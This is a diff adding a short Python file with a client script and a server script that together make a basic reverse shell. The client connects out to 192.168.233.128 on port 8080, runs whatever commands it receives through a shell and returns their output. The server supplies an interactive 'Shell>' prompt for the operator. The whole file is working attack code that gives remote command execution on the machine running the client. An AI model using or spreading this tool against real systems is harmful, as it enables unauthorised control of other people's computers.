@@ -1,0 +1,51 @@
+Client side Script;
+
+import socket
+import subprocess
+
+
+def connect():
+    Mysocket = socket.socket()
+    Mysocket.connect(("192.168.233.128", 8080))
+
+    while True:
+        command = Mysocket.recv(1024)
+        if "terminate" in command.decode():
+            Mysocket.close()
+            break
+        else:
+            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            Mysocket.send(CMD.stdout.read())
+            Mysocket.send(CMD.stderr.read())
+def main():
+    connect()
+if __name__ == "__main__":
+    main()
+
+Server Side script
+
+import socket
+
+print("Waiting for connection....")
+
+def connect():
+    Mysocket = socket.socket()
+    Mysocket.bind(("192.168.233.128", 8080))
+    Mysocket.listen(1)
+    connection, address = Mysocket.accept()
+    print("Connection established", address)
+
+    while True:
+        command = input ("Shell> : ")
+        if "terminate" in command:
+            connection.send("terminate".encode())
+            connection.close()
+            break
+        else:
+            connection.send(command.encode())
+            print(connection.recv(1024).decode())
+
+def main():
+    connect()
+
+main()
